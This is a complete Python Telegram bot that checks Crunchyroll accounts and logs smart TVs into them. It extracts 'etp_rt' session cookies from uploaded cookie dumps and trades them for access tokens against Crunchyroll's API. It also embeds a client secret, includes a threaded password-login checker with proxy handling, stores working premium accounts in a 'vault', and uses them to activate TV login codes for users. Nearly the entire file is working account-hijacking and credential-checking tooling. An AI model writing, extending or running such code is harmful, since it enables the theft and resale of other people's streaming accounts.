#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Crunchyroll Checker + Vault + Smart TV Login Bot
"""

import os
import re
import io
import sys
import csv
import json
import time
import base64
import random
import asyncio
import logging
import zipfile
import tempfile
import threading
import requests
import uuid
import http.server
import socketserver
from pathlib import Path
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

try:
    from telegram import (
        Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup,
        ReplyKeyboardRemove, BotCommand,
    )
    from telegram.constants import ParseMode
    from telegram.error import BadRequest, RetryAfter
    from telegram.ext import (
        Application, CommandHandler, MessageHandler, CallbackQueryHandler,
        ContextTypes, filters,
    )
except ImportError:
    print("[!] pip install python-telegram-bot==22.8")
    sys.exit(1)

# ===================== CONFIG =====================
def _load_dotenv() -> None:
    env_path = Path(__file__).resolve().parent / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            val = val.strip().strip("'\"")
            if key and key not in os.environ:
                os.environ[key] = val
    except OSError:
        pass

def _env(name: str, default: str = "") -> str:
    v = os.getenv(name)
    if v is None or str(v).strip() == "":
        return default
    return str(v).strip()

_load_dotenv()

BOT_TOKEN = _env("BOT_TOKEN")
OWNER_ID = int(_env("OWNER_ID", "0") or 0)
OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")

_raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
ADMIN_IDS = set()
if _raw_ids:
    for _x in re.split(r"[,\s]+", _raw_ids):
        _x = _x.strip()
        if _x.isdigit():
            ADMIN_IDS.add(int(_x))
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)

DATA_DIR = Path(_env("DATA_DIR", "data"))
DATA_DIR.mkdir(parents=True, exist_ok=True)
VAULT_PATH = DATA_DIR / "cr_vault.json"

PORT = int(_env("PORT", "8080") or 8080)
THREADS = int(_env("THREADS", "150") or 150)
PROXY_REFRESH_MINUTES = 5
MAX_PROXIES_TO_KEEP = 500
PROXY_TEST_TIMEOUT = 2
PROXY_TEST_SAMPLE = 1000
CHECK_TIMEOUT = 10

DAILY_TV_LIMIT = int(_env("DAILY_TV_LIMIT", "10") or 10)
IST = timezone(timedelta(hours=5, minutes=30))

USER_LAST_CHECK: dict = {}
USER_LOCK = threading.Lock()
MAX_FILE_MB = 20
PREMIUM_ONLY_DEFAULT = True
MAX_PASTED_CREDS = 2000
MAX_HIT_CARDS = 150

START_TIME = time.time()
CHECKS_DONE = 0
CHECKS_LOCK = threading.Lock()

# ===================== WEB SERVER (Render Timeout Fix) =====================
def run_health_check():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
        def log_message(self, format, *args):
            pass # Suppress logs
    try:
        with socketserver.TCPServer(("", PORT), Handler) as httpd:
            print(f"[+] Dummy Web Server running on port {PORT} (Render Fix)")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] Web server error: {e}")

# ===================== HELPERS =====================
def now_utc(): return datetime.now(timezone.utc)

def parse_iso(s) -> Optional[datetime]:
    if not s: return None
    try:
        dt = datetime.fromisoformat(str(s).replace("Z", "+00:00"))
        if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except: return None

def days_left_until(iso_date: str) -> str:
    if not iso_date: return "N/A"
    dt = parse_iso(iso_date)
    if not dt: return "N/A"
    return str(max(0, (dt - now_utc()).days))

def _clean_err(e): return " ".join(str(e).split())[:60]
def esc(v): return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") if v else "N/A"

def flag_emoji(cc) -> str:
    cc = (cc or "").upper().strip()
    if len(cc) != 2 or not cc.isalpha(): return ""
    return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)

# ===================== VAULT STORAGE =====================
_VAULT_LOCK = threading.Lock()

def load_vault() -> List[dict]:
    with _VAULT_LOCK:
        if VAULT_PATH.exists():
            try: return json.loads(VAULT_PATH.read_text(encoding="utf-8"))
            except: return []
        return []

def save_vault(items: List[dict]) -> None:
    with _VAULT_LOCK:
        try:
            tmp = VAULT_PATH.with_suffix(".tmp")
            tmp.write_text(json.dumps(items, indent=2, ensure_ascii=False), encoding="utf-8")
            os.replace(tmp, VAULT_PATH)
        except: pass

def add_to_vault(entries: List[dict]) -> int:
    if not entries: return 0
    with _VAULT_LOCK:
        current = []
        if VAULT_PATH.exists():
            try: current = json.loads(VAULT_PATH.read_text(encoding="utf-8"))
            except: current = []
        have = {f"{x.get('cred',{}).get('type')}:{str(x.get('cred',{}).get('value')).lower()}" for x in current}
        added = 0
        for e in entries:
            cred = e.get("cred") or {}
            k = f"{cred.get('type')}:{str(cred.get('value')).lower()}"
            if not k or k in have: continue
            current.append({"cred": cred, "data": e.get("data") or {}, "added_at": int(time.time())})
            have.add(k)
            added += 1
        if added:
            try:
                tmp = VAULT_PATH.with_suffix(".tmp")
                tmp.write_text(json.dumps(current, indent=2, ensure_ascii=False), encoding="utf-8")
                os.replace(tmp, VAULT_PATH)
            except Exception as exc: print("Vault write failed:", exc)
        return added

def vault_count(): return len(load_vault())

# ===================== CRUNCHYROLL API =====================
API_HOST = "https://beta-api.crunchyroll.com"
CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
APP_DEVICE_TYPE = "Google SDK built for x86"
APP_DEVICE_NAME = "sdk_google_atv_x86"
BARO_WUA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"

_tls = threading.local()
def get_session():
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        _tls.s = s
    return s

def _req(session, method, url, proxy, **kw):
    try: return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
    except requests.RequestException:
        if proxy: return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
        raise

def _blank_data(user): return {"user": user.split("@")[0], "plan": "", "cc": "", "expiry": "", "days_left": "N/A", "streams": ""}

def app_login(user, pw, proxy=None):
    s = get_session()
    try:
        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy,
            data={"grant_type": "password", "username": user, "password": pw, "scope": "offline_access",
                  "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "device_type": APP_DEVICE_TYPE,
                  "device_id": str(uuid.uuid4()), "device_name": APP_DEVICE_NAME},
            headers={"User-Agent": APP_UA, "Content-Type": "application/x-www-form-urlencoded"})
    except: return None, "network"
    if r.status_code != 200: return None, "bad"
    return r.json(), "ok"

def etp_rt_to_token(etp_rt, proxy=None):
    s = get_session()
    try:
        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy,
            data={"grant_type": "etp_rt_cookie", "device_id": str(uuid.uuid4()), "device_type": "Firefox"},
            cookies={"etp_rt": etp_rt})
    except: return None, "network"
    if r.status_code != 200: return None, "bad"
    return r.json(), ""

def check_token_or_cookie(bearer, proxy=None):
    s = get_session()
    hdr = {"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA}
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
        if r.status_code != 200: return "err", _blank_data("")
        me = r.json()
    except: return "err", _blank_data("")
    
    d = _blank_data(me.get("email") or "")
    try:
        r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{me.get('account_id')}/subscriptions", proxy, headers=hdr)
        subs = r.json().get("subscriptions", [])
        if subs:
            sub = subs[0]
            plan = sub.get("plan", {})
            d["plan"] = plan.get("tier", {}).get("text", "Premium")
            d["expiry"] = sub.get("nextRenewalDate", "")[:10]
            d["days_left"] = days_left_until(sub.get("nextRenewalDate"))
            d["cc"] = plan.get("countryCode", "")
            return "hit", d
    except: pass
    return "free", d

def activate_tv(bearer: str, code: str, proxy: Optional[dict] = None):
    s = get_session()
    clean_code = re.sub(r"[^A-Za-z0-9]", "", str(code or "")).upper().strip()
    if len(clean_code) != 6: return False, "invalid_code"
    headers = {"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA, "Content-Type": "application/json"}
    for base in ("https://www.crunchyroll.com", API_HOST):
        try:
            r = _req(s, "POST", f"{base}/auth/v1/device", proxy, json={"user_code": clean_code}, headers=headers)
            if r.status_code in (200, 201, 204): return True, ""
        except: pass
    return False, "failed"

def extract_credentials(text: str) -> List[dict]:
    creds, seen = [], set()
    for line in (text or "").splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 7 and parts[5].strip().lower() == "etp_rt":
            val = parts[6].strip()
            if val and val not in seen: seen.add(val); creds.append({"type": "cookie", "value": val})
    for m in re.finditer(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", text, re.I):
        val = m.group(1).strip()
        if val and val not in seen: seen.add(val); creds.append({"type": "cookie", "value": val})
    return creds

# ===================== BOT LOGIC =====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"🔥 **Crunchyroll Bot**\n\n🗄️ Vault Accounts: `{vault_count()}`\n\n📂 Send a `.txt`, `.json`, or `.zip` file to scan and save to vault.\n📺 Use `/tv CODE` to activate a TV."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc: return
    note = await update.message.reply_text("📥 Downloading & scanning...")
    
    tg_file = await context.bot.get_file(doc.file_id)
    buf = io.BytesIO()
    await tg_file.download_to_memory(buf)
    text = buf.getvalue().decode("utf-8", errors="ignore")
    
    creds = extract_credentials(text)
    if not creds:
        await note.edit_text("❌ No valid cookies found in file.")
        return
        
    await note.edit_text(f"🔍 Found {len(creds)} cookies. Checking...")
    
    hits = []
    def check_one(cred):
        j, err = etp_rt_to_token(cred["value"])
        if not j: return None
        st, d = check_token_or_cookie(j["access_token"])
        if st == "hit": return {"cred": cred, "data": d, "st": "hit"}
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        for res in ex.map(check_one, creds):
            if res: hits.append(res)
            
    if hits:
        add_to_vault(hits)
        await note.edit_text(f"✅ **Scan Complete!**\n\nFound **{len(hits)}** working accounts.\nSaved to Vault.\nTotal Vault: `{vault_count()}`", parse_mode=ParseMode.MARKDOWN)
    else:
        await note.edit_text("❌ Scan finished. No working premium accounts found.")

async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: `/tv ABCD12`", parse_mode=ParseMode.MARKDOWN)
        return
    code = context.args[0].upper()
    if len(code) != 6:
        await update.message.reply_text("❌ Code must be 6 characters.")
        return
        
    vault = load_vault()
    if not vault:
        await update.message.reply_text("❌ Vault is empty. Upload cookies first.")
        return
        
    msg = await update.message.reply_text(f"📺 Activating TV with code `{code}`...", parse_mode=ParseMode.MARKDOWN)
    
    for entry in reversed(vault):
        cred = entry.get("cred", {})
        if cred.get("type") == "cookie":
            j, err = etp_rt_to_token(cred["value"])
            if j:
                ok, _ = activate_tv(j["access_token"], code)
                if ok:
                    await msg.edit_text(f"✅ **TV Activated Successfully!**\n\nPlan: `{entry['data'].get('plan')}`\nExpiry: `{entry['data'].get('expiry')}`", parse_mode=ParseMode.MARKDOWN)
                    return
    await msg.edit_text("❌ Activation failed. Code might be invalid or no working account left in vault.")

def main():
    if not BOT_TOKEN or not OWNER_ID:
        print("[!] BOT_TOKEN or OWNER_ID missing.")
        return
        
    threading.Thread(target=run_health_check, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("tv", cmd_tv))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"[+] Bot started | Owner: {OWNER_ID} | Vault: {vault_count()}")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
